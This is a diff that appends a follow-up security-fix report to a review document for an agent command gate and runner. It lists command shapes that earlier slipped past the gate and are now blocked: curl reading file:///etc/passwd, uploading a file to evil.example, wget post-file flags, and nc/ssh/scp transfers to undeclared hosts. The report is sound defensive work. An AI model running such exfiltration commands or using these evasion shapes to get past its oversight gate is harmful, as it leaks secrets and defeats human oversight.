@@ -110,3 +110,59 @@ exact outcomes.
   errand+expiry binding is enforced in the claim ledger and the runner's
   `current()` re-checks, which kills the replay repro without breaking the
   frozen canonical format shared with `errands`/bridge receipts.
+
+---
+
+## Follow-up round — residual shapes (2026-11-26, PR #156)
+
+Re-verification of the merged fixes found the enumerated repros closed but
+further shapes of the **same declared class** still tier 2 — exactly the
+"argument shapes are unbounded … never tier 2 by omission" rule. Fixed from
+`arena/89f04216-elaria` (main synced to `a654b3b` first), merged as
+`a9fa8ed` (PR **#156**).
+
+**BUG-B1 residuals (`gate.py`).**
+
+| shape | before | after |
+|---|---|---|
+| `curl --url=file:///etc/passwd`, `curl -ofile:///etc/passwd` | 2 | 3 |
+| `curl -K f`, `--config=f`, `--netrc-file f`, `wget -e …` | 2 | 3 |
+| `curl -sd@sub/note.txt https://evil.example` (bundled upload short) | 2 | 3 |
+| `wget --post-data=@f` / `--post-file` / `--body-data` / `--body-file` | 2 | 3 |
+| `scp`/`sftp`/`rsync`/`ssh`/`nc`/`socat`/… to an undeclared host | 2 | 3 |
+
+- `_as_url()`/`_urls()` parse a URI carried as another flag's value, so the
+  scheme can no longer hide behind a flag prefix.
+- `_option_loading()` → 3 (options loaded from a file/inline string are argv
+  we never see); scoped so `-e` stays an ordinary operand for `grep`/`sed`
+  (`grep -e pat f` still tier 0, unchanged from baseline).
+- `_upload_shape()` scans the whole short bundle, not only `arg[1]`.
+- wget body/POST flags joined `UPLOAD_FLAG_NAMES`.
+- `_remote_egress()`/`_remote_host()`: `user@host:path`, `ssh://` URLs and
+  bracketed IPv6 literals resolve to a host; destination outside
+  `facts.owner_services` → 3, local→local → 2, a declared owner service keeps
+  its ask lane.
+- `paths()` also takes attached upload/output values, so `-o/etc/passwd` is
+  sandbox- and credential-checked.
+
+**BUG-B2 residual (`runner.py`).** `queue.current(errand, digest)` is now
+re-checked **per step**, not only around `owner_prompt`: a plan superseded in
+`errands` mid-batch halted at the next step (`halted/stale-plan`, one click
+fired) instead of completing every click. The claim ledger (once-globally,
+per-digest 12 budget, strict int counts, ask TTL) is untouched and frozen.
+
+**Evidence.** +28 regressions; 21 B1 cases and the B2 mid-batch case fail on
+the pre-hardening source and pass after (verified by stashing the source
+change, not by assertion). hands/gate/mouse/typing slice: 552 passed,
+1 skipped. Whole suite: 3497 passed, 32 skipped, 32 failed — the same 32
+streaming/wire-lane failures measured on unmodified `main`
+(`test_stream_g7`, `test_stream_f_wire`, `test_stream_g_primary`,
+`test_stream_h_sensors`, `test_live_repro_arm_b`). Frozen thresholds
+untouched; `OWNERS.yaml` untouched; no process launched, no owner path
+touched.
+
+**Flagged.** The remote-transfer rule is default-deny (no owner-declared
+services → any `nc`/`scp`/`ssh` host is tier 3), while `curl`/`wget` keep
+their pre-existing shape (a plain GET stays tier 2, caught by
+`sends_owner_content`/`effects_complete`). Say so if the GET lanes should be
+aligned or the egress set trimmed.
